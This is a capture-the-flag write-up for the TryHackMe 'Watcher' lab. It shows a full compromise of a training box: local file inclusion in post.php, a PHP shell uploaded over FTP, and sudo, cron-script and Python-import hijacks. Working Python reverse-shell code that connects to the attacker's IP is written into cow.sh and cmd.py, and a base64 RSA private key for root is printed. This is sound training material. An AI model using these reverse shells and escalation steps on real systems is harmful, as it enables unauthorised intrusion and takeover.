---
layout: default
title: Watcher
description: THM - Watcher
---

## Setup
```
openvpn TudorMindra.ovpn
python3 -m http.server
```
## Enumeration

Nmap Scan:
```
Nmap scan report for 10.10.9.142
Host is up (0.077s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Jekyll v4.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Corkplacemats
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Gobuster:
```
/images
/css
```
Robots.txt:
```
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```
Surely there won't be anything interesting in the secret file.

Let's read it.
```
http://10.10.9.142/secret_file_do_not_read.txt

Forbidden

You don't have permission to access this resource.
Apache/2.4.29 (Ubuntu) Server at 10.10.9.142 Port 80
```
Uh-Oh! We don't have permission.

The website shows some items, let's see if we can make it point at the secret file.

Transform this:
```
http://10.10.9.142/post.php?post=round.php
```
Into this:
```
http://10.10.9.142/post.php?post=secret_file_do_not_read.txt
```
And voila! We got ftp creds.
```
Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:[REDACTED]
```
Let's login and snoop around.
```
Connected to 10.10.9.142.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41059|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 files
-rw-r--r--    1 0        0              21 Dec 03  2020 flag_2.txt
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||47352|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||44029|)
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Dec 03  2020 .
dr-xr-xr-x    3 65534    65534        4096 Dec 03  2020 ..
226 Directory send OK.
ftp> put shell.php
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||47448|)
150 Ok to send data.
100% |************************************************************************************|  2571      167.49 KiB/s    00:00 ETA
226 Transfer complete.
2571 bytes sent in 00:00 (17.44 KiB/s)
ftp> WE HAVE WRITE PERMISSION
```
Great! We found the 2nd flag, and we have write permissions in the "files" folder.

Time to get ourselves a reverse shell. The message tells us where the files are saved, so we'll abuse LFI to open our php shell.
```
nc -lvnp 9002     
Listening on 0.0.0.0 9002
Connection received on 10.10.9.142 55396
SOCKET: Shell has connected! PID: 1827
which python
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@watcher:/var/www/html$ 
```
Now let's look around for privesc opportunities.
```
www-data@watcher:/var/www/html$ cd /home
cd /home
www-data@watcher:/home$ ls
ls
ftpuser  mat  toby  will
www-data@watcher:/home$ cd toby 
cd toby
www-data@watcher:/home/toby$ ls
ls
flag_4.txt  jobs  note.txt
www-data@watcher:/home/toby$ cat note.txt
cat note.txt
Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
www-data@watcher:/home/toby$ cd ../mat
cd ../mat
www-data@watcher:/home/mat$ ls
ls
cow.jpg  flag_5.txt  note.txt  scripts
www-data@watcher:/home/mat$ cat note.txt
cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
www-data@watcher:/home/mat$ cd ../will
cd ../will
www-data@watcher:/home/will$ ls
ls
flag_6.txt
www-data@watcher:/home/will$
```
Looking at the flags, we'll need to escalate in this order: toby -> mat -> will

Let's get to it!
```
www-data@watcher:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on watcher:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on watcher:
    (toby) NOPASSWD: ALL
www-data@watcher:/var/www/html$ sudo -u toby /bin/bash
sudo -u toby /bin/bash
toby@watcher:/var/www/html$
```
We could run any command with sudo, as the toby user, so that's what we used to move on to toby.

And yes, we'll ignore the pwnkit exploit.

Now, we know about the cow.sh cronjob.
```
toby@watcher:~/jobs$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
*/1 * * * * mat /home/toby/jobs/cow.sh
toby@watcher:~/jobs$
```
Apparently, it runs on mat's user, but toby can edit it. So let's append a reverse shell to it.
```
toby@watcher:~/jobs$ cat > cow.sh << EOF
cat > cow.sh << EOF
> #!/bin/bash
#!/bin/bash
> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.116.220",9003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
<;os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
> EOF
EOF
toby@watcher:~/jobs$

nc -lvnp 9003
Listening on 0.0.0.0 9003
Connection received on 10.10.9.142 49506
$ id
id
uid=1002(mat) gid=1002(mat) groups=1002(mat)
$ 
```
We now have a mat shell. Nice. Let's move on to will.
```
mat@watcher:~$ cat note.txt
cat note.txt
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
mat@watcher:~$ cd scripts
cd scripts
mat@watcher:~/scripts$ ls
ls
cmd.py  will_script.py
mat@watcher:~/scripts$ ls -la     
ls -la
total 16
drwxrwxr-x 2 will will 4096 Dec  3  2020 .
drwxr-xr-x 6 mat  mat  4096 Dec  3  2020 ..
-rw-r--r-- 1 mat  mat   133 Dec  3  2020 cmd.py
-rw-r--r-- 1 will will  208 Dec  3  2020 will_script.py
mat@watcher:~/scripts$ cat will_script.py
cat will_script.py
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
        print("Invalid command!")
        exit()

os.system(cmd)
mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
mat@watcher:~/scripts$ nano cmd.py
nano cmd.py
Error opening terminal: unknown.
mat@watcher:~/scripts$ vim cmd.py
vim cmd.py
^[[C^[[D^[[C:qd(num):
  [[2;2Rif(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"                                                                              
                                                                         
mat@watcher:~/scripts$ ls
ls
cmd.py  will_script.py
mat@watcher:~/scripts$ cat cmd.py
cat cmd.py
def get_command(num):
        if(num == "1"):
                return "ls -lah"
        if(num == "2"):
                return "id"
        if(num == "3"):
                return "cat /etc/passwd"
mat@watcher:~/scripts$ cat < cmd.py >> EOF
cat < cmd.py >> EOF
bash: EOF: Permission denied
mat@watcher:~/scripts$ cat > cmd.py << EOF
cat > cmd.py << EOF
> import socket, subprocess, os
import socket, subprocess, os
> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
> s.connect(("10.18.116.220",4444))
s.connect(("10.18.116.220",4444))
> os.dup2(s.fileno(),0)
os.dup2(s.fileno(),0)
> os.dup2(s.fileno(),1)
os.dup2(s.fileno(),1)
> os.dup2(s.fileno(),2)
os.dup2(s.fileno(),2)
> p=subprocess.call(["/bin/sh","-i"])
p=subprocess.call(["/bin/sh","-i"])
> def get_command(num):
def get_command(num):
>     if(num == "1"):
    if(num == "1"):
>         return "ls -lah"
        return "ls -lah"
>     if(num == "2"):
    if(num == "2"):
>         return "id"
        return "id"
>     if(num == "3"):
    if(num == "3"):
>         return "cat /etc/passwd"
        return "cat /etc/passwd"
> EOF
EOF
mat@watcher:~/scripts$ ls
ls
cmd.py  will_script.py
cmat@watcher:~/scripts$ at cmd.py
cat cmd.py
import socket, subprocess, os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.18.116.220",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
def get_command(num):
    if(num == "1"):
        return "ls -lah"
    if(num == "2"):
        return "id"
    if(num == "3"):
        return "cat /etc/passwd"
mat@watcher:~/scripts$
```
So, basically, we have write access to cmd.py, which the script imports. So we just added our reverse shell to it.

Let's set up a listener and power up the script, let's see what's what.
```
mat@watcher:~/scripts$ sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 1
</usr/bin/python3 /home/mat/scripts/will_script.py 1

nc -lvnp 4444               
Listening on 0.0.0.0 4444
Connection received on 10.10.9.142 39246
$ id
uid=1000(will) gid=1000(will) groups=1000(will),4(adm)
$ 
```
Now from "will", let's see if we can escalate to root.
```
will@watcher:/home$ cd /root
cd /root
bash: cd: /root: Permission denied
will@watcher:/home$ cd /opt
cd /opt
will@watcher:/opt$ ls
ls
backups
will@watcher:/opt$ cd backups
cd backups
will@watcher:/opt/backups$ ls
ls
key.b64
will@watcher:/opt/backups$ cat key.b64
cat key.b64
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBelBhUUZvbFFx
OGNIb205bXNzeVBaNTNhTHpCY1J5QncrcnlzSjNoMEpDeG5WK2FHCm9wWmRjUXowMVlPWWRqWUlh
WkVKbWRjUFZXUXAvTDB1YzV1M2lnb2lLMXVpWU1mdzg1ME43dDNPWC9lcmRLRjQKanFWdTNpWE45
ZG9CbXIzVHVVOVJKa1ZuRER1bzh5NER0SXVGQ2Y5MlpmRUFKR1VCMit2Rk9ON3E0S0pzSXhnQQpu
TThrajhOa0ZrRlBrMGQxSEtIMitwN1FQMkhHWnJmM0RORm1RN1R1amEzem5nYkVWTzdOWHgzVjNZ
T0Y5eTFYCmVGUHJ2dERRVjdCWWI2ZWdrbGFmczRtNFhlVU8vY3NNODRJNm5ZSFd6RUo1enBjU3Jw
bWtESHhDOHlIOW1JVnQKZFNlbGFiVzJmdUxBaTUxVVIvMndOcUwxM2h2R2dscGVQaEtRZ1FJREFR
QUJBb0lCQUhtZ1RyeXcyMmcwQVRuSQo5WjVnZVRDNW9VR2padjdtSjJVREZQMlBJd3hjTlM4YUl3
YlVSN3JRUDNGOFY3cStNWnZEYjNrVS80cGlsKy9jCnEzWDdENTBnaWtwRVpFVWVJTVBQalBjVU5H
VUthWG9hWDVuMlhhWUJ0UWlSUjZaMXd2QVNPMHVFbjdQSXEyY3oKQlF2Y1J5UTVyaDZzTnJOaUpR
cEdESkRFNTRoSWlnaWMvR3VjYnluZXpZeWE4cnJJc2RXTS8wU1VsOUprbkkwUQpUUU9pL1gyd2Z5
cnlKc20rdFljdlk0eWRoQ2hLKzBuVlRoZWNpVXJWL3drRnZPRGJHTVN1dWhjSFJLVEtjNkI2CjF3
c1VBODUrdnFORnJ4ekZZL3RXMTg4VzAwZ3k5dzUxYktTS0R4Ym90aTJnZGdtRm9scG5Gdyt0MFFS
QjVSQ0YKQWxRSjI4a0NnWUVBNmxyWTJ4eWVMaC9hT0J1OStTcDN1SmtuSWtPYnBJV0NkTGQxeFhO
dERNQXo0T3FickxCNQpmSi9pVWNZandPQkh0M05Oa3VVbTZxb0VmcDRHb3UxNHlHek9pUmtBZTRI
UUpGOXZ4RldKNW1YK0JIR0kvdmoyCk52MXNxN1BhSUtxNHBrUkJ6UjZNL09iRDd5UWU3OE5kbFF2
TG5RVGxXcDRuamhqUW9IT3NvdnNDZ1lFQTMrVEUKN1FSNzd5UThsMWlHQUZZUlhJekJncDVlSjJB
QXZWcFdKdUlOTEs1bG1RL0UxeDJLOThFNzNDcFFzUkRHMG4rMQp2cDQrWThKMElCL3RHbUNmN0lQ
TWVpWDgwWUpXN0x0b3pyNytzZmJBUVoxVGEybzFoQ2FsQVF5SWs5cCtFWHBJClViQlZueVVDMVhj
dlJmUXZGSnl6Z2Njd0V4RXI2Z2xKS09qNjRiTUNnWUVBbHhteC9qeEtaTFRXenh4YjlWNEQKU1Bz
K055SmVKTXFNSFZMNFZUR2gydm5GdVR1cTJjSUM0bTUzem4reEo3ZXpwYjFyQTg1SnREMmduajZu
U3I5UQpBL0hiakp1Wkt3aTh1ZWJxdWl6b3Q2dUZCenBvdVBTdVV6QThzOHhIVkk2ZWRWMUhDOGlw
NEptdE5QQVdIa0xaCmdMTFZPazBnejdkdkMzaEdjMTJCcnFjQ2dZQWhGamkzNGlMQ2kzTmMxbHN2
TDRqdlNXbkxlTVhuUWJ1NlArQmQKYktpUHd0SUcxWnE4UTRSbTZxcUM5Y25vOE5iQkF0aUQ2L1RD
WDFrejZpUHE4djZQUUViMmdpaWplWVNKQllVTwprSkVwRVpNRjMwOFZuNk42L1E4RFlhdkpWYyt0
bTRtV2NOMm1ZQnpVR1FIbWI1aUpqa0xFMmYvVHdZVGcyREIwCm1FR0RHd0tCZ1FDaCtVcG1UVFJ4
NEtLTnk2d0prd0d2MnVSZGo5cnRhMlg1cHpUcTJuRUFwa2UyVVlsUDVPTGgKLzZLSFRMUmhjcDlG
bUY5aUtXRHRFTVNROERDYW41Wk1KN09JWXAyUloxUnpDOUR1ZzNxa3R0a09LQWJjY0tuNQo0QVB4
STFEeFUrYTJ4WFhmMDJkc1FIMEg1QWhOQ2lUQkQ3STVZUnNNMWJPRXFqRmRaZ3Y2U0E9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
```
I'm not gonna redact this, if you got this far, props to you. When we decode this, it's a rsa file, and we'll assume it's the root rsa file.
```
┌──(root㉿CERBERUS)-[/home/tlsec]
└─# chmod 400 watcher_rsa 
                                                                                                                                 
┌──(root㉿CERBERUS)-[/home/tlsec]
└─# ssh root@10.10.9.142 -i watcher_rsa

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


33 packages can be updated.
0 updates are security updates.


Last login: Thu Dec  3 03:25:38 2020

root@watcher:~# id
uid=0(root) gid=0(root) groups=0(root)
root@watcher:~# 
```
Now we're root!

Good hunting o7

[Try it out yourself!](https://tryhackme.com/room/watcher)
